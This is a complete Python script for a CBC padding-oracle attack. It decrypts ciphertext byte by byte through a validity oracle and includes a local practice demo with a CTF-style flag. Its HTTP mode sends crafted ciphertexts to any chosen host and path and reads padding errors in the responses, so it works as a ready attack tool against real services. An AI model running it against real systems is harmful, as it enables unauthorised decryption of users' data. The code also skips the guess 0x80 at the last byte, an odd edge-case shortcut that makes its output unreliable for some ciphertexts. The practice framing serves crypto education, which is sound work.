#!/usr/bin/env python3
"""
padding_oracle.py — CBC padding-oracle attack skeleton.
Works against any oracle callable that returns True/False for valid padding.
Includes a local demo server + attack client so you can practice offline.

Usage:
  python3 padding_oracle.py --demo                 # run built-in demo (attack local oracle)
  python3 padding_oracle.py --host H --port P --path /api   # attack HTTP oracle (POST ct b64)
"""
import argparse, base64, os, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

BLOCK = 16

def http_oracle(host, port, path):
    import urllib.request
    def oracle(ct: bytes) -> bool:
        req = urllib.request.Request(
            f"http://{host}:{port}{path}",
            data=base64.b64encode(ct),
            headers={"Content-Type": "application/octet-stream"})
        try:
            r = urllib.request.urlopen(req, timeout=10)
            body = r.read()
            return b"padding" not in body.lower() and r.status == 200
        except Exception:
            return False
    return oracle

def local_oracle_factory(key):
    def oracle(ct: bytes) -> bool:
        try:
            c = AES.new(key, AES.MODE_CBC, ct[:BLOCK])
            unpad(c.decrypt(ct[BLOCK:]), BLOCK)
            return True
        except ValueError:
            return False
    return oracle

def attack(oracle, ct: bytes, progress=True) -> bytes:
    """Classic Vaudenay attack. ct = IV || C1 || C2 ..."""
    blocks = [ct[i:i+BLOCK] for i in range(0, len(ct), BLOCK)]
    out = b""
    for bi in range(len(blocks) - 1, 0, -1):
        prev = bytearray(blocks[bi - 1])
        target = blocks[bi]
        rec = bytearray(BLOCK)
        for pos in range(BLOCK - 1, -1, -1):
            padval = BLOCK - pos
            for guess in range(256):
                mod = bytearray(prev)
                for j in range(pos + 1, BLOCK):
                    mod[j] = rec[j] ^ padval
                mod[pos] = guess
                crafted = bytes(mod) + target
                if oracle(crafted):
                    if pos == BLOCK - 1 and guess == 0x80:
                        continue  # ambiguous last block edge; keep simple
                    rec[pos] = guess ^ padval
                    break
            else:
                raise RuntimeError(f"no valid byte at pos {pos} block {bi}")
        out = bytes(rec) + out
        if progress:
            print(f"[+] block {bi}: {out!r}")
    return out

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--demo", action="store_true")
    ap.add_argument("--host"); ap.add_argument("--port", type=int)
    ap.add_argument("--path", default="/"); ap.add_argument("--ct", help="b64 ct")
    a = ap.parse_args()
    if a.demo:
        key = os.urandom(16)
        msg = b"CSG_FLAG{padding_oracles_are_fun_and_you_should_practice}"
        iv = os.urandom(16)
        ct = iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(msg, BLOCK))
        print(f"[*] demo ciphertext (b64): {base64.b64encode(ct).decode()}")
        rec = attack(local_oracle_factory(key), ct)
        print("[+] recovered plaintext:", rec)
    else:
        o = http_oracle(a.host, a.port, a.path)
        ct = base64.b64decode(a.ct)
        print("[+] plaintext:", attack(o, ct))
